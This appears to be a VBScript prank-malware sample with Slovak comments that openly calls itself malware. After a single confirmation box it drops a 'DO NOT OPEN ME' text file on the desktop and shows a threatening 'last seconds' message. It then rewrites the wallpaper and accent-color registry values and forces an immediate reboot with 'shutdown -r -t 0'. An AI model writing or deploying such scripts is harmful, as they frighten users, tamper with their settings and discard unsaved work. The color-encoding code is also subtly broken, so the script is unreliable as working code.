Option Explicit

' Funkcia na zmenu pozadia pracovnej plochy na červený obrázok
Sub SetDesktopBackground(imagePath)
    Dim strKeyPath, strValueName
    strKeyPath = "HKEY_CURRENT_USER\Control Panel\Desktop"
    strValueName = "Wallpaper"
    With CreateObject("WScript.Shell")
        .RegWrite strKeyPath & "\" & strValueName, imagePath, "REG_SZ"
    End With
    ' Spustiť príkaz na aktualizáciu pozadia
    With CreateObject("WScript.Shell")
        .Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    End With
End Sub

' Funkcia na zmenu farby personalizácie
Sub SetPersonalizationColor(red, green, blue)
    Dim strKeyPathAccent, strValueNameAccent, strValueAccent
    strKeyPathAccent = "HKEY_CURRENT_USER\Software\Microsoft\Windows\DWM"
    strValueNameAccent = "AccentColor"
    strValueAccent = "&H" & Hex(blue) & Hex(green) & Hex(red) & "FF"
    With CreateObject("WScript.Shell")
        .RegWrite strKeyPathAccent & "\" & strValueNameAccent, CLng(strValueAccent), "REG_DWORD"
    End With
End Sub

' Funkcia na pridanie textového dokumentu na pracovnú plochu
Sub AddTextFileToDesktop()
    Dim objFSO, objFile, strFilePath, strContent
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    strFilePath = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\!!!DO NOT OPEN ME!!!.txt"
    strContent = "Contrags you open me do you want to play a game ok then look behind you"
    Set objFile = objFSO.CreateTextFile(strFilePath, True)
    objFile.WriteLine strContent
    objFile.Close
End Sub

' Upozornenie pred spustením skriptu
Dim response
response = MsgBox("WARNING: this malware is not a joke. this is for eudocational prospures only. Do you wish to continue", vbExclamation + vbYesNo, "WARNING")
If response = vbNo Then
    WScript.Quit
End If

' Pridať textový dokument na pracovnú plochu
AddTextFileToDesktop()

' Zobraziť chybové hlásenie
MsgBox "Your last seconds using your pc", vbCritical + vbOKOnly, "Enjoy"

' Nastaviť pozadie na červený obrázok
SetDesktopBackground "C:\red.bmp"

' Nastaviť farbu personalizácie na červenú
SetPersonalizationColor 255, 0, 0

' Reštartovať počítač (Použite s opatrnosťou)
CreateObject("WScript.Shell").Run "shutdown -r -t 0"

